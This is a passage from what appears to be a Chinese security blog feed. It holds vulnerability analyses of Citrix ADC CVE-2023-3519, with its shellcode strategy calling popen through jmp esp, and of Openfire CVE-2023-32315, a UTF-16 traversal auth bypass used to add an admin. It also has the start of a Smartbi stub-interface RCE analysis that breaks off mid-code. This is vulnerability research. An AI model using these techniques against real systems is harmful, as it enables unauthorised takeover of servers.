ADC中，nsppe是网络子系统，一当nsppe进程down了，会造成系统无法处理网络请求，最直观的表现就是当ssh连接目标系统并使用gdb调试nsppe进程的时候，ssh会卡死，而后退出，因为服务器的网络子系统处于调试状态，没办法处理网络请求。</p><p>所以在整个利用过程中，为了保证能够获取到shell/保活系统，要保证nsppe进程不会挂掉。通过shellcode调用popen函数然后执行系统命令，并返回到上层调用栈（保证请求正常返回）。</p><p>之后就是常规则shellcode编写了，直接使用二进制文件内硬编码的popen函数地址即可。需要注意的就是nsppe内实现的url解码逻辑有点不太一样， 具体参考参考链接，这里就不详细展开了。</p><h3 id="小结">小结</h3><p>整个漏洞产生和利用原理简单直接，因为nsppe没有开启任何溢出防护措施，直接使用jmp esp即可，让我想起了这个经典表情包<img alt="" src="/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/6.png"/>
不知道是不是因为这个引擎起源比较久的原因，nsppe没有去除调试符号，对于理解原理和调试exp都有非常大的帮助。</p><blockquote><p><a href="https://mybrokencomputer.net/t/citrix-adc-netscaler-developer-license/42" target="_blank">申请开发人员许可</a></p><p><a href="https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/" target="_blank">https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/</a></p></blockquote><p><strong>Created at 2023-07-27T10:48:40+08:00</strong></p></description></item><item><title>CVE-2023-32315 Openfire 身份认证绕过漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/</link><pubDate>Tue, 20 Jun 2023 17:42:33 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/</guid><description><h3 id="基本信息">基本信息</h3><p>Openfire中存在目录遍历漏洞，通过使用UTF-16编码的<code>../</code>，可以绕过身份验证，访问一些敏感接口，通过这些接口可以新建管理员，上传插件，进一步造成代码执行</p><h3 id="影响版本">影响版本</h3><p>3.10.0 &lt;= Openfire &lt; 4.6.8
4.7.0 &lt;= Openfire &lt; 4.7.5</p><h3 id="环境搭建">环境搭建</h3><p>直接下载对应的exe安装即可</p><h3 id="技术分析调试">技术分析&amp;调试</h3><p>在Openfire中，<code>/setup/setup-*</code>开头的url由AuthCheckFilter处理，并且访问该url无需经过身份验证（白名单），这个Filter定义在<code>xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java</code>中。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;filter></span></span></span><span style="display:flex;"><span>       <span style="color:#f92672">&lt;filter-name></span>AuthCheck<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span>       <span style="color:#f92672">&lt;filter-class></span>org.jivesoftware.admin.AuthCheckFilter<span style="color:#f92672">&lt;/filter-class></span></span></span><span style="display:flex;"><span>       <span style="color:#f92672">&lt;init-param></span></span></span><span style="display:flex;"><span>           <span style="color:#f92672">&lt;param-name></span>excludes<span style="color:#f92672">&lt;/param-name></span></span></span><span style="display:flex;"><span>           <span style="color:#f92672">&lt;param-value></span></span></span><span style="display:flex;"><span>                login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/param-value></span></span></span><span style="display:flex;"><span>       <span style="color:#f92672">&lt;/init-param></span></span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/filter></span></span></span></code></pre></div><p>在<code>xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java</code>中通过以下代码判断是否存在目录穿越</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">boolean</span><span style="color:#a6e22e">testURLPassesExclude</span>(String url, String exclude) {</span></span><span style="display:flex;"><span>       <span style="color:#75715e">// If the exclude rule includes a "?" character, the url must exactly match the exclude rule.</span></span></span><span style="display:flex;"><span>       <span style="color:#75715e">// If the exclude rule does not contain the "?" character, we chop off everything starting at the first "?"</span></span></span><span style="display:flex;"><span>       <span style="color:#75715e">// in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a "*"</span></span></span><span style="display:flex;"><span>       <span style="color:#75715e">// character then the URL is allowed if it exactly matches everything before the * and there are no ".."</span></span></span><span style="display:flex;"><span>       <span style="color:#75715e">// characters after the "*". All data in the URL before</span></span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">if</span> (exclude.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">"*"</span>)) {</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> (url.<span style="color:#a6e22e">startsWith</span>(exclude.<span style="color:#a6e22e">substring</span>(0, exclude.<span style="color:#a6e22e">length</span>()<span style="color:#f92672">-</span>1))) {</span></span><span style="display:flex;"><span>               <span style="color:#75715e">// Now make sure that there are no ".." characters in the rest of the URL.</span></span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>url.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">".."</span>)<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>url.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">"%2e"</span>)) {</span></span><span style="display:flex;"><span>                   <span style="color:#66d9ef">return</span><span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span>                }</span></span><span style="display:flex;"><span>            }</span></span><span style="display:flex;"><span>        }</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (exclude.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">"?"</span>)) {</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> (url.<span style="color:#a6e22e">equals</span>(exclude)) {</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">return</span><span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span>            }</span></span><span style="display:flex;"><span>        }</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">int</span> paramIndex<span style="color:#f92672">=</span> url.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">"?"</span>);</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> (paramIndex<span style="color:#f92672">!=</span><span style="color:#f92672">-</span>1) {</span></span><span style="display:flex;"><span>                url<span style="color:#f92672">=</span> url.<span style="color:#a6e22e">substring</span>(0, paramIndex);</span></span><span style="display:flex;"><span>            }</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> (url.<span style="color:#a6e22e">equals</span>(exclude)) {</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">return</span><span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span>            }</span></span><span style="display:flex;"><span>        }</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>   </p><p>但该代码没有考虑到其他形式的UNICODE编码，而后端却可以解析该url，导致可以使用UTF-16编码绕过目录穿越检查，并且由于可以匹配<code>/setup/setup-</code>*，也无需身份验证，即攻击者可以利用该漏洞绕过身份验证，任意访问后台。</p><p>攻击者可以利用该漏洞添加管理员，而后通过管理员身份上传恶意插件，造成代码执行。</p><p><strong>结果</strong></p><p>通过该漏洞添加管理员账户</p><p><img alt="" src="/images/vulnerability/CVE-2023-32315-Openfire-auth-bypass.zh-cn.assets/1.png"/><img alt="" src="/images/vulnerability/CVE-2023-32315-Openfire-auth-bypass.zh-cn.assets/2.png"/></p><p><strong>参考链接</strong></p><blockquote><p><a href="https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm" target="_blank">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></p></blockquote><p><strong>Created at 2023-06-20T17:42:33+08:00</strong></p></description></item><item><title>Smartbi RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</link><pubDate>Fri, 16 Jun 2023 16:07:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</guid><description><h3 id="基本信息">基本信息</h3><blockquote><p>Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。</p><p>Smartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。</p></blockquote><p>引用自<a href="https://nox.qianxin.com/vulnerability/detail/QVD-2023-5326" target="_blank">奇安信NOX</a></p><h3 id="影响版本">影响版本</h3><p>V7&lt;= Smartbi &lt;= V10.5.8</p><h3 id="环境搭建">环境搭建</h3><p>官网下载Smartbi V10.5.8即可，直接安装。</p><h3 id="技术分析调试">技术分析&amp;调试</h3><p>解包官网提供的补丁包，可以发现如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#f92672">"version"</span>:<span style="color:#e6db74">"1.0"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"date"</span>:<span style="color:#e6db74">"2023-02-28 15:00:00"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"patches"</span>: {</span></span><span style="display:flex;"><span><span style="color:#f92672">"PATCH_20230228"</span>: {</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc"</span>:<span style="color:#e6db74">"修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc_zh_TW"</span>:<span style="color:#e6db74">"修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc_en"</span>:<span style="color:#e6db74">"Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"urls"</span>: [{</span></span><span style="display:flex;"><span><span style="color:#f92672">"url"</span>:<span style="color:#e6db74">"*.stub"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"rules"</span>: [{</span></span><span style="display:flex;"><span><span style="color:#f92672">"type"</span>:<span style="color:#e6db74">"RejectStubPostPatchRule"</span></span></span><span style="display:flex;"><span> }]</span></span><span style="display:flex;"><span> }]</span></span><span style="display:flex;"><span> },</span></span><span style="display:flex;"><span><span style="color:#f92672">"PATCH_20221122"</span>: {</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc"</span>:<span style="color:#e6db74">"修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc_zh_TW"</span>:<span style="color:#e6db74">"修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc_en"</span>:<span style="color:#e6db74">"Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"urls"</span>: [{</span></span><span style="display:flex;"><span><span style="color:#f92672">"url"</span>:<span style="color:#e6db74">"/vision/RMIServlet"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"rules"</span>: [{</span></span><span style="display:flex;"><span><span style="color:#f92672">"className"</span>:<span style="color:#e6db74">"DataSourceService"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"methodName"</span>:<span style="color:#e6db74">"testConnectionList"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"type"</span>:<span style="color:#e6db74">"RejectRMIParamsStringsPatchRule"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"strings"</span>: [<span style="color:#e6db74">"clientRerouteServerListJNDIName"</span>]</span></span><span style="display:flex;"><span> },{</span></span><span style="display:flex;"><span><span style="color:#f92672">"className"</span>:<span style="color:#e6db74">"DataSourceService"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"methodName"</span>:<span style="color:#e6db74">"testConnection"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"type"</span>:<span style="color:#e6db74">"RejectRMIParamsStringsPatchRule"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"strings"</span>: [<span style="color:#e6db74">"clientRerouteServerListJNDIName"</span>]</span></span><span style="display:flex;"><span> }]</span></span><span style="display:flex;"><span> }]</span></span><span style="display:flex;"><span> },</span></span></code></pre></div><p>可以看出来，补丁包对符合正则表达式<code>*.stub</code> 的url进行了处理，再根据补丁描述不难发现前一个补丁补的漏洞：DB2 命令执行漏洞。此处的漏洞应该是对其进行了绕过。</p><p>转到web.xml里面，*.stub是由RMIServlet进行处理的，且只有两个filter。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-name></span>RMIServlet<span style="color:#f92672">&lt;/servlet-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>*.stub<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping></span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-name></span>CacheFilter<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>*.stub<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping></span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-name></span>GZIPFilter<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>*.stub<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping></span></span></span></code></pre></div><p>继续查看web.xml，不难发现一些敏感接口均要经过CheckIsLoggedFilter，结合反编译的源码，猜测此filter为鉴权filter</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-name></span>CheckIsLoggedFilter<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>/vision/ExportServlet<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-name></span>CheckIsLoggedFilter<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>/vision/ExportHttpServlet<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-name></span>CheckIsLoggedFilter<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>/vision/DownloadExcelServlet<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-name></span>CheckIsLoggedFilter<span style="color:#f92672">&lt;/filter-name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url-pattern></span>/vision/MigrateServlet<span style="color:#f92672">&lt;/url-pattern></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping></span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">CheckIsLoggedFilter</span><span style="color:#66d9ef">implements</span> javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">Filter</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span> IExtendCustomFilter customFilterChecker;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span> Logger LOG<span style="color:#f92672">=</span> Logger.<span style="color:#a6e22e">getLogger</span>(CheckIsLoggedFilter.<span style="color:#a6e22e">class</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">>></span> AUTHORITYMAP<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: smartbi-FreeQuery.jar:smartbi/freequery/filter/CheckIsLoggedFilter$IExtendCustomFilter.class */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">interface</span><span style="color:#a6e22e">IExtendCustomFilter</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">authorityFiltering</span>(String str, String str2, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">destroy</span>() {</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* JADX WARN: Removed duplicated region for block: B:137:0x060f A[RETURN] */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Code decompiled incorrectly, please refer to instructions dump.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> To view partially-correct code enable 'Show inconsistent code' option in preferences</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">doFilter</span>(javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">ServletRequest</span> r9, javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">ServletResponse</span> r10, javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">FilterChain</span> r11)<span style="color:#66d9ef">throws</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">IOException</span>, javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">ServletException</span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">/*</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Method dump skipped, instructions count: 1568</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> To view this dump change 'Code comments level' option to 'DEBUG'</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> UnsupportedOperationException(<span style="color:#e6db74">"Method not decompiled: smartbi.freequery.filter.CheckIsLoggedFilter.doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain):void"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">handleAutoLogin</span>(HttpServletRequest request) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (FreeQueryModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getUserManagerModule</span>().<span style="color:#a6e22e">isLogged</span>()) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> String headerUserName<span style="color:#f92672">=</span> Bootstrap.<span style="color:#a6e22e">getHeaderUserName</span>(request);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(headerUserName)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> IState state<span style="color:#f92672">=</span> (IState) request.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">"state"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">boolean</span> isLogged<span style="color:#f92672">=</span> (state<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">||</span> state.<span style="color:#a6e22e">getUser</span>()<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>)<span style="color:#f92672">?</span><span style="color:#66d9ef">false</span> :<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>isLogged) {</span></span><span style="display:flex;"><span> String headerPassword<span style="color:#f92672">=</span> Bootstrap.<span style="color:#a6e22e">getHeaderPassword</span>(request);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (headerPassword<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> headerPassword<span style="color:#f92672">=</span> SmartbiXDataSetUtil.<span style="color:#a6e22e">OTHER</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> FreeQueryModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getStateModule</span>().<span style="color:#a6e22e">doStartRequest</span>(request);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">boolean</span> isAutoLogin<span style="color:#f92672">=</span> FreeQueryModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getUserManagerModule</span>().<span style="color:#a6e22e">login</span>(headerUserName, headerPassword);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (isAutoLogin) {</span></span><span style="display:flex;"><span> request.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">"isNeedAutoLogout"</span>,<span style="color:#e6db74">"true"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而*.stub并未经过这个filter的处理，也就是未授权即可访问。</p><p>转到Smartbi的RMIServlet中有如下代码，进行GET请求时，携带jsonpCallback参数即可转到doPost方法，该方法通过RMIUtil.parseRMIInfo方法获取RMI信息，跟进。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">doGet</span>(HttpServletRequest req, HttpServletResponse resp)<span style="color:#66d9ef">throws</span> ServletException {</span></span><span style="display:flex;"><span> String uri<span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getRequestURI</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> String jsonpCallback<span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">"jsonpCallback"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(jsonpCallback)) {</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> doPost(req, resp);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (IOException e) {</span></span><span style="display:flex;"><span> LOG.<span style="color:#a6e22e">error</span>(uri<span style="color:#f92672">+</span><span style="color:#e6db74">"\n"</span><span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>(), e);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* JADX WARN: Finally extract failed */</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span><span style="color:#75715e">// smartbi.framework.rmi.IRMIServlet</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">doPost</span>(HttpServletRequest request, HttpServletResponse resp)<span style="color:#66d9ef">throws</span> ServletException, IOException {</span></span><span style="display:flex;"><span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">doStartRequest</span>(request);</span></span><span style="display:flex;"><span> TraceConfig traceConfig<span style="color:#f92672">=</span> (TraceConfig) request.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">"TraceConfig"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">tracedetail</span><span style="color:#f92672">&amp;&amp;</span> traceConfig<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> traceConfig<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> TraceConfig();</span></span><span style="display:flex;"><span> request.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">"TraceConfig"</span>, traceConfig);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> RMIInfo rmiInfo<span style="color:#f92672">=</span> RMIUtil.<span style="color:#a6e22e">parseRMIInfo</span>(request,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> String className<span style="color:#f92672">=</span> rmiInfo<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">?</span><span style="color:#66d9ef">null</span> : rmiInfo.<span style="color:#a6e22e">getClassName</span>();</span></span><span style="display:flex;"><span> String methodName<span style="color:#f92672">=</span> rmiInfo<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">?</span><span style="color:#66d9ef">null</span> : rmiInfo.<span style="color:#a6e22e">getMethodName</span>();</span></span><span style="display:flex;"><span> String params<span style="color:#f92672">=</span> rmiInfo<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">?</span><span style="color:#66d9ef">null</span> : rmiInfo.<span style="color:#a6e22e">getParams</span>();</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> String resultStr<span style="color:#f92672">=</span> processExecute(request, className, methodName, params);</span></span><span style="display:flex;"><span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">doRollback</span>();</span></span><span style="display:flex;"><span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">doEndRequest</span>(request);</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Throwable th) {</span></span><span style="display:flex;"><span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">doRollback</span>();</span></span><span style="display:flex;"><span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">doEndRequest</span>(request);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> th;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>RMIUtil.parseRMIInfo方法首先判断uri是否是/vision/RMIServlet，而后获取请求的className、methodName、<code>params</code>参数，并返回RMIInfo对象</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> RMIInfo<span style="color:#a6e22e">parseRMIInfo</span>(HttpServletRequest request,<span style="color:#66d9ef">boolean</span> forceParse) {</span></span><span 